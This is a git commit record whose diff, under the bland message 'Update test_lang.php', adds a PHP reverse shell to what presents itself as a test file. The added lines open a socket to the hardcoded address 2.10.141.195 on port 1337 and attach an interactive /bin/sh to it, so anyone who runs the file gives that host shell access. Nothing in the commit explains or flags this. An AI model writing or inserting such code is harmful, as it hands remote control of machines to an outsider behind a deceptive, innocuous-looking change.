869ecbc62f260b00bd6bde33f724e325a47c2994
Thomas <152532580+c0w5lip@users.noreply.github.com>
2025-06-29 23:58:13 +0200

    Update test_lang.php

--- test_lang.php
+++ test_lang.php
@@ -1,5 +1,14 @@
 <?php
 
-echo("a");
+echo("ok");
+$ip = '2.10.141.195';
+$port = 1337;
+
+$sock = fsockopen($ip, $port);
+$proc = proc_open("/bin/sh -i", [
+  0 => $sock,
+  1 => $sock,
+  2 => $sock
+], $pipes);
 
 ?>
